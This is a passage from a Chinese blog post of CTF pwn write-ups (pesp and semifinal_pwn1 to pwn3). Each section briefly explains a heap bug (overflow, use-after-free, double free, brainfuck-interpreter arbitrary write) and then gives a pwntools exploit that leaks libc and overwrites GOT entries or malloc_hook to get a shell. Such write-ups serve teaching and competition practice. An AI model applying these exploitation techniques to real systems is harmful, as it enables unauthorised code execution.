+</span></span></code></pre></td></tr></table></div></div><h2 id=pesp>pesp</h2><p>编辑时新的 size 并没有作检查，导致可以堆溢出。利用堆溢出修改空闲 fast chunk 的 <code>fd</code>，手动造成 uaf，借助假的 <code>0x7f</code> 伪造 chunk 分配到 <code>itemlist</code> 上方从而修改 <code>itemlist</code> 中的内容指针达到任意地址写，泄露 libc 后覆盖 <code>atoi</code> 为 <code>system</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=mh>0x6020ad</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x60</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x71</span><span class=p>,</span><span class=n>fake</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 1</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>base</span><span class=p>,</span><span class=n>libc</span><span class=p>,</span><span class=n>system</span> <span class=o>=</span> <span class=n>leak_libc</span><span class=p>(</span><span class=s1>&#39;atoi&#39;</span><span class=p>,</span><span class=n>atoi</span><span class=p>,</span><span class=n>libc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=semifinal_pwn1>semifinal_pwn1</h2><p>本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块 0x130 的 chunk，释放后进入 unsorted bin。随后就可以利用 uaf 泄露 libc 并借助 <code>update</code> 功能覆盖 got 表。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>reg</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;desc&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_free</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=n>choice</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;(a/d)&#39;</span><span class=p>,</span> <span class=n>choice</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view_profile</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;desc&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>reg</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>reg</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>login</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>,</span><span class=s1>&#39;d&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>view_profile</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Age:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logout</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>reg</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>login</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>puts</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>)[:</span><span class=o>-</span><span class=mi>2</span><span class=p>])</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=semifinal_pwn2>semifinal_pwn2</h2><p>这题比较有意思，程序是一个 brainfuck 解释器，规则是：</p><ul><li><code>&lt;</code>： <code>p--</code></li><li><code>></code>： <code>p++</code></li><li><code>.</code>： <code>putc(*p)</code></li><li><code>,</code>： <code>read(0,p,1)</code></li><li><code>+</code>： <code>*p++</code></li><li><code>-</code>： <code>*p--</code></li></ul><p>换句话说已经可以构造任意地址读写了，那么首先利用上述规则泄露 <code>stdin</code> 来泄露 libc，然后用 one_gadget 覆盖 got 表。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>stdin</span> <span class=o>=</span> <span class=mh>0x602090</span>
+</span></span><span class=line><span class=cl><span class=n>star</span> <span class=o>=</span> <span class=mh>0x6020c0</span>
+</span></span><span class=line><span class=cl><span class=n>exit</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;exit&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&lt;&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>star</span><span class=o>-</span><span class=n>stdin</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;&lt;&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stdin</span><span class=o>+</span><span class=mi>6</span><span class=o>-</span><span class=n>exit</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;,&gt;,&gt;,&gt;,&gt;,&gt;,&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stdin</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>stdin</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdin_&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span> <span class=o>+</span> <span class=mh>0xf1147</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=p>(</span><span class=n>one</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=semifinal_pwn3>semifinal_pwn3</h2><p>本题当输入选项为 <code>1337</code> 时会调用一个奇怪的函数，但实际上由于 uaf 漏洞的存在这个函数并没有什么用。还有一个比较少见的 <code>clean</code> 功能用于清除所有指针，这里是不存在 uaf 的。</p><p>我们可以直接 unsorted bin 泄露 libc（这里是通过 <code>clean</code> 功能清楚指针，重新申请到释放的 small chunk 后泄露 <code>bk</code>），然后 double free 写 <code>malloc_hook</code>，最后故意 double free 触发 <code>malloc_print_err</code>，调用 <code>malloc_hook</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>clean</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>clean</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0xf02a4</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>malloc_hook</span><span class=o>-</span><span class=mh>0x23</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x13</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># malloc_print_err</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2020-05-04</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/>栈漏洞</a>,&nbsp;<a href=/tags/fsb/>fsb</a>,&nbsp;<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/>堆漏洞</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/pwn-template/ class=prev rel=prev title="Pwn 脚本模板"><i class="fas fa-angle-left fa-fw"></i>Pwn 脚本模板</a>
+<a href=/passwd/ class=next rel=next title="pAssWD 开发记录">pAssWD 开发记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
